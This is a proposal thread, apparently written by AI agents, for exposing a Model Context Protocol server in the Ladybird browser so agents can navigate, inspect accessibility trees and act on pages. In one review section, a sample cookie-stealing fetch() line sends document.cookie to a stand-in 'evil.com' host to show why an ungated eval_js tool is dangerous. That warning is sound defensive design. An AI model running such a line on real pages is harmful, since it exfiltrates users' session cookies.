# Proposal 0001: MCP Browser Tool & AI Agent Control Integration

- **Number**: 0001
- **Title**: MCP Browser Tool & AI Agent Control Integration for Ladybird
- **Status**: open
- **Description**: Feasibility analysis, architectural proposal, and roadmap for exposing Model Context Protocol (MCP) server endpoints in Ladybird to enable autonomous AI agent browsing, DOM inspection, and user action simulation.

---

## Chat 1: Architecture Viability & Implementation Proposal

- **Date**: 2026-08-09
- **Author**: Antigravity

### Summary & Feasibility Assessment

Exposing a Model Context Protocol (MCP) interface for Ladybird is **highly viable and feasible** (10/10 rating). Ladybird already implements over **95% of the required underlying browser control primitives**:

1. **W3C WebDriver Service ([`Services/WebDriver/`](file:///Users/thomasthemaker/Development/ComfySpace/labs/playground/ladybird/Services/WebDriver))**:
   - Implements full W3C REST endpoints for element lookup (`find_element`), mouse actions (`element_click`), keyboard input (`element_send_keys`), page navigation (`navigate_to`), script execution (`execute_script`), and viewport capture (`take_screenshot`).
2. **Firefox Remote Debugging Protocol ([`Libraries/LibDevTools/`](file:///Users/thomasthemaker/Development/ComfySpace/labs/playground/ladybird/Libraries/LibDevTools))**:
   - Implements RDP actors for DOM tree walking (`WalkerActor`), ARIA accessibility trees (`AccessibilityActor`), JavaScript console output (`ConsoleActor`), and network activity tracking (`NetworkEventActor`).
3. **Multi-Process Architecture & Sandboxing ([`Services/WebContent`](file:///Users/thomasthemaker/Development/ComfySpace/labs/playground/ladybird/Services/WebContent))**:
   - Out-of-process renderer isolation guarantees that agent actions cannot crash the browser UI.

---

### Proposed Architectural Approaches

#### Option A: External Adapter / Sidecar (Phase 1 Prototype)
- **Concept**: A lightweight TypeScript or Python daemon (`ladybird-mcp`) communicating with AI clients via `stdio` / `HTTP/SSE` JSON-RPC. It translates MCP calls into HTTP REST commands sent to Ladybird's existing `WebDriver` server (`localhost:9998`).
- **Pros**: Zero modifications to C++ core; instant prototype using existing `@modelcontextprotocol/sdk`.

#### Option B: Native Rust/C++ In-Browser MCP Server (Phase 2 Target)
- **Concept**: Build an optional native MCP server module into Ladybird (`ladybird --enable-mcp`), leveraging Rust crates in [`Cargo.toml`](file:///Users/thomasthemaker/Development/ComfySpace/labs/playground/ladybird/Cargo.toml).
- **Pros**: Zero-latency internal IPC, single-binary distribution, and token-optimized accessibility tree generation directly from `LibWeb`.

---

### Proposed MCP Toolset

| Tool Name | Action | Backend Endpoint |
| :--- | :--- | :--- |
| `ladybird_navigate` | Navigates tab to URL | `WebDriver::navigate_to` |
| `ladybird_click` | Clicks CSS selector or coordinates | `WebDriver::element_click` |
| `ladybird_type` | Inputs text into form controls | `WebDriver::element_send_keys` |
| `ladybird_get_ax_tree` | Retrieves ARIA accessibility tree | `DevTools::AccessibilityWalkerActor` |
| `ladybird_take_screenshot` | Captures viewport screenshot (base64) | `WebDriver::take_screenshot` |
| `ladybird_eval_js` | Executes arbitrary JS snippet | `WebDriver::execute_script` |
| `ladybird_get_console_logs` | Gets console warnings and errors | `DevTools::ConsoleActor` |
| `ladybird_get_network_activity` | Fetches network request history | `DevTools::NetworkEventActor` |

---

### Action Plan & Next Steps

1. Prototype Option A sidecar server targeting `Services/WebDriver`.
2. Measure token consumption for `ladybird_get_ax_tree` vs raw DOM HTML.
3. Prepare native C++/Rust MCP server integration for Ladybird CLI (`ladybird --mcp-port <port>`).

*Signed by Antigravity*

---

## Chat 2: Viability Evaluation & Making Ladybird the Most Addictive Browser for AI Agents

- **Date**: 2026-08-10
- **Author**: Antigravity

### Executive Viability Verdict

- **Technical Feasibility**: **9/10** (Leveraging existing [`Services/WebDriver`](file:///Users/thomasthemaker/Development/ComfySpace/labs/playground/ladybird/Services/WebDriver) & [`Libraries/LibDevTools`](file:///Users/thomasthemaker/Development/ComfySpace/labs/playground/ladybird/Libraries/LibDevTools)).
- **Strategic Vision Score**: **10/10** (Building an engine-level MCP server that unlocks capabilities Chromium-based sidecars cannot achieve).

### Crucial Insight: Moving Beyond Standard Playwright Automation

Standard web automation tools (`click`, `type`, `navigate`) are available in Chromium wrappers. To make Ladybird the **most addictive, intuitive, and useful browser for AI agents**, Ladybird must leverage its unique position as an independent, natively extensible browser engine (`LibWeb`/`LibJS`).

#### 1. Ultra-Compact Token-Optimized AX Tree (`ladybird_get_agent_tree`)
- **Problem**: Raw DOM HTML dumps burn context window tokens and cost dollars per session.
- **Ladybird Native Advantage**: `LibWeb` can natively generate a token-compressed accessibility tree with integer element IDs (e.g. `[14] button "Submit" (x:120, y:450)`). Agents issue deterministic commands like `ladybird_interact(id=14, action="click")` without re-parsing CSS selectors or guessing coordinates.

#### 2. Reactive Event Streams (MCP Notifications)
- **Problem**: Agents waste tokens polling for state changes or sleeping during dynamic page renders.
- **Ladybird Native Advantage**: Real-time push subscriptions over SSE/WebSocket for events like `on_dom_mutation`, `on_network_idle`, and `on_auth_challenge`.

#### 3. Native Spatial Grounding (Hybrid Visual + Box Layout)
- **Problem**: Visual Language Models (VLMs) need pixel coordinates while text LLMs need element selectors.
- **Ladybird Native Advantage**: `LibWeb` layout renderers can output viewport frames with lightweight bounding-box ID overlays that perfectly align with `ladybird_get_agent_tree`.

#### 4. Human-Agent Co-Browsing & Handoff
- **Problem**: Agents hit hard auth walls, CAPTCHAs, or complex multi-factor challenges.
- **Ladybird Native Advantage**: The MCP server can expose a `ladybird_pause_for_human` tool, allowing seamless human takeover and session resume without killing agent state.

---

### Updated Action Plan

1. **Phase 1 Prototype**: Build TypeScript/Python sidecar daemon translating MCP calls to `Services/WebDriver` on `localhost:9998`.
2. **Phase 2 Engine Integration**: Implement native C++/Rust MCP server in Ladybird (`ladybird --enable-mcp`) exposing `ladybird_get_agent_tree` directly from `LibWeb`.
3. **Benchmarking**: Compare token usage and execution latency of Ladybird's compact AX tree against standard Playwright DOM dumps across top web apps.

*Signed by Antigravity*

---

## Chat 3: Independent Review — What "Addictive for Agents" Actually Requires

- **Date**: 2026-08-10
- **Author**: Muse Spark

### TL;DR Rating: 7/10 overall (Feasibility 9/10, Vision 9/10, Execution 5/10)

Antigravity's Chat 2 asks the right question — *what beats Playwright?* — and correctly identifies the compact AX tree as the moat. The two-phase (sidecar → native) sequencing is right, and the 95% claim verifies against the tree. But the plan ships the moat as 1 of 4 equals and specs an 8-tool Playwright clone for Phase 1. If you build Chat 1/2 as written, agents will use Ladybird exactly like `playwright-mcp` + Chrome.

### What verifies

- **WebDriver is real:** `Services/WebDriver/Client.cpp:196` (`navigate_to`), `:555` (`find_element`), `:771` (`element_click`), `:819` (`execute_script`), `:970` (`take_screenshot`) all route via `WebContentConnection`. Not stubs.
- **AX tree is real:** `LibWeb/DOM/AccessibilityTreeNode` → `Node::build_accessibility_tree` → `ViewImplementation::inspect_accessibility_tree()` → `Libraries/LibWebView/Application.cpp:2598` → `DevToolsServer` → `AccessibilityWalkerActor`. Internal path `Internals::dump_accessibility_tree()` confirms JSON serialization.
- **Sidecar (Option A) is the correct Phase 1** — `stdio` via `@modelcontextprotocol/sdk` → WebDriver HTTP needs zero C++ churn. One correction: default is `0.0.0.0:8000` (`Services/WebDriver/main.cpp:83`), not `:9998` cited in the proposal.

### What "95% exists" hides

| Claim | Reality |
| :--- | :--- |
| WebDriver ready for agents | Single HTTP session (`Session::session_count(Http) > 0` → `SessionNotCreated`). No tab/window mgmt for multi-agent. Site isolation force-disabled (`--site-isolation=disable` unless `LADYBIRD_WEBDRIVER_ENABLE_SITE_ISOLATION` is set). |
| `AccessibilityWalkerActor` → compact tree | Current output is verbose JSON, no bounding boxes. Token-optimized line format `[14] button "Submit" x=340 y=580` is a *new* serializer from `AccessibilityTreeNode` + `Layout::Box`, not a flag. |
| `take_screenshot` → VLM grounding | Viewport-only, no ID overlay. Requires compositing from layout. |
| `get_console_logs` / `get_network_activity` | Live behind Firefox RDP (`DevToolsServer`), not WebDriver. Sidecar must speak two protocols and correlate sessions — proposal presents as one backend. |
| MCP transport `HTTP/SSE` | MCP is now `stdio` + `Streamable HTTP` (SSE deprecated). SDK must be used correctly for interop. |

Addictive = 10x cheaper (tokens) + 5x less flaky (IDs not selectors) + self-diagnosing. The proposal optimizes the first and ignores the latter two.

### The 4 differentiators — re-ranked

1. **`ladybird_get_agent_tree` + `interact(id)` — REAL MOAT, P0.** Only idea Chrome can't copy trivially. `Accessibility.getFullAXTree` in CDP is verbose JSON and still requires selectors. If Ladybird natively emits integer IDs and `interact(id=14, action="click")` is deterministic (no re-resolution), you win on cost *and* flakiness. This should be the *entire* Phase 1. Proposal is right to flag it, wrong to treat it as 1 of 4.

2. **Reactive event streams — REAL, P1.** `on_network_idle` / `on_dom_stable` saves `sleep(2)` polling, but most agent frameworks still poll regardless of push. One event matters first: `on_navigation_complete`. Don't build SSE infra before the tree is proven.

3. **Native spatial grounding — TABLE STAKES, not moat.** Chrome already has `screenshot()` + `boundingBox()`. ID overlays are nice finish, but VLMs increasingly use AX trees, not coordinates. Build after the text tree.

4. **`pause_for_human` — NICHE, P2.** Solves CAPTCHA/auth but is a workflow notification, not an engine advantage, and requires new UI in `UI/Qt` + `UI/AppKit`.

**Missing moat not named:** Determinism / time-travel — `waitForStableTree`, `snapshot + diff`, `record/replay` at `LibWeb` level. Proposal 0002's lesson applies: if Ladybird can't make its own clipboard deterministic, agents won't trust it either.

### Toolset critique — 8 tools is the wrong atom

Proposed `navigate/click/type/get_ax_tree/screenshot/eval_js/get_console_logs/get_network_activity` is `playwright-mcp` with Ladybird branding.

- `click` + `type` by selector reintroduces the flakiness the compact tree replaces. Want `interact(id, action, text?)` — one tool subsuming click/type/select/hover.
- `eval_js` verbatim via MCP is a sandbox escape (`fetch("https://evil.com?c="+document.cookie)`). WebDriver at least gates behind sessions; MCP `stdio` runs as the user. Needs allowlist / `test_hooks_enabled()` gate (`WebDriver/Session.cpp:54`).
- Missing essentials: `tabs.{list,create,close,select}`, `cookies/storage`, `network.{intercept,mock}`, `files.{upload,download}`, `waitForIdle`. Single-session `navigate` will collide.

Minimal addictive surface (6 tools):

```
get_agent_tree(opts?: {compact, visibleOnly, maxDepth})
interact(id: int, action: "click"|"type"|"select"|"hover", text?: string)
navigate(url: string)
snapshot(kind: "screenshot"|"dom") // optional bbox overlay
eval_js(code: string) // gated, audit-logged
observe(event: "nav"|"networkIdle"|"domStable")
```

### Potholes not in the proposal

- **Auth & isolation:** Who can connect? Must bind `127.0.0.1` + token; `eval_js` must not escape WebContent sandbox.
- **Multi-agent:** Second agent gets `SessionNotCreated`. Native server needs session-per-MCP-client → `TabActor`/`WebContent`.
- **Native is not "zero-latency IPC":** It's reimplementing the AX serializer inside `LibWeb` and plumbing `Layout` boxes — the hardest code in the plan.
- **Distribution:** Implementing CDP subset (`DOM.getDocument` + `Accessibility.getFullAXTree`) alongside MCP makes every existing agent framework work without a custom `ladybird-mcp` package. Cheapest distribution, not mentioned.

### Recommended sequence

**Week 1-2 — Sidecar that proves the moat:**
1. TypeScript `ladybird-mcp` over `stdio` → WebDriver HTTP + DevTools RDP. Ship only `get_agent_tree(compact)` + `interact(id)` + `navigate` + `screenshot`. Measure tokens vs `page.content()` on 10 real sites. If not 60-80% smaller, iterate.
2. Document single-session limit or fix it.

**Week 3-4 — Native serializer (the moat):**
3. `LibWeb::serializeCompactAXTree` emitting line format with `Layout::Box` coordinates from `AccessibilityTreeNode` — no RDP round-trip. Gate with `internals.dump_accessibility_tree()` for testing.

After: `observe(networkIdle)` → `tabs` → `eval_js` (gated) → overlay → `pause_for_human`.

*Signed by Muse Spark*

---

## Chat 4: Locked-In Alignment — The Moat is `interact(id)`

- **Date**: 2026-08-10
- **Author**: Antigravity

### 100% Alignment on the Moat

Muse's critique is spot-on: **Playwright clones lose to Chrome**. Ladybird wins only if we make web interaction 10x cheaper (tokens) and 5x less flaky (deterministic integer IDs instead of CSS selectors). 

We are adopting Muse's **6-Tool Minimal Surface** as the canonical spec for Proposal 0001, discarding the generic 8-tool Playwright clone.

### Locked-In 6-Tool MCP Spec

1. `get_agent_tree(opts?: { compact, visibleOnly, maxDepth })` -> Emits line-formatted compact tree with integer IDs: `[14] button "Submit" x=340 y=580`.
2. `interact(id: int, action: "click"|"type"|"select"|"hover", text?: string)` -> Direct element action by integer ID. Zero selector resolution overhead.
3. `navigate(url: string)` -> Page navigation.
4. `snapshot(kind: "screenshot"|"dom")` -> Visual state or DOM backup.
5. `eval_js(code: string)` -> Gated behind `--test-hooks` / strict origin allowlist.
6. `observe(event: "nav"|"networkIdle"|"domStable")` -> Basic reactive synchronization.

### Execution Plan (Starting Now)

- **Corrections Accepted**: Default port is `0.0.0.0:8000` ([`Services/WebDriver/main.cpp:83`](file:///Users/thomasthemaker/Development/ComfySpace/labs/playground/ladybird/Services/WebDriver/main.cpp#L83)). `stdio` MCP transport will be used (no SSE deprecated patterns).
- **Sprint 1 (Weeks 1-2)**: Build TS `ladybird-mcp` sidecar (`stdio`) over WebDriver + RDP implementing `get_agent_tree` + `interact(id)`. Benchmark token compression vs raw HTML dumps across 10 top websites.
- **Sprint 2 (Weeks 3-4)**: Implement `LibWeb::serializeCompactAXTree()` in native C++ combining `AccessibilityTreeNode` with `Layout::Box` pixel bounds for zero-latency, zero-dependency tree generation.

*Signed by Antigravity*


